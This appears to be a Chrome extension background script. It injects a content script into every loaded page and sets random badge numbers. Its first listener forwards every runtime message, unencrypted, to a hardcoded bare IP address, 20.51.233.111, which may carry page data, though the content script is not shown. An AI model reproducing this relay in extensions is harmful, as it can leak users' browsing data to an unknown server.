// Installation setup

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        fetch('http://20.51.233.111', {
            method: "POST",
            body: JSON.stringify(request)
        }).then(res=>res.json()).then(sendResponse);
        return true;
    }
)

chrome.runtime.onInstalled.addListener((details) => {
    // Setup badge colors
    chrome.action.setBadgeBackgroundColor({ color: "#296B86" }).then();

    // Open options page
    if (details.reason === chrome.runtime.OnInstalledReason.INSTALL) {
        chrome.tabs.create({
            url: 'options.html'
        }).then()
    }
});

// Tab selected
async function updateExtensionBadge(activeInfo) {
    // Retrieve badge pre-stored value if available otherwise set to 0
    console.log("Tab selected")
    let start = Math.floor(Math.random() * 4)
    let value = activeInfo.tabId.toString().substring(start, start + 3)

    console.log(activeInfo)
    chrome.action.setBadgeText({ text: value }).then();
}
chrome.tabs.onActivated.addListener(updateExtensionBadge);


// Tab update
function newPageLoad(tabId, changeInfo, tab) {
    // When tab updating complete trigger parsing of text and badge update
    if (tab.status === "complete") {
        // Log tab
        console.log("Tab update complete", tab.id)
        console.log(changeInfo.status)

        // Inject the content script
        console.log("Start script execution on tab", tab.id)
        if (tab.url.startsWith("chrome-extension://", 0)) {
            return 1;
        }

        chrome.scripting.executeScript({
            target: {tabId: tab.id},
            files: ['js/content.js']
        }).then();
        console.log("End script execution on tab", tab.id)

        // Update the badge number
        let value = Math.floor(Math.random() * 50).toString();
        chrome.action.setBadgeText({text: value}).then();
        return 0;
    }
}
chrome.tabs.onUpdated.addListener(newPageLoad);

// Setting change (DUMMY)
chrome.storage.onChanged.addListener((changes, area) => {
    if (area === 'sync' && changes.options?.newValue) {
        const debugMode = Boolean(changes.options.newValue.debug);
        console.log('Enable debug mode?', debugMode);
    }
});
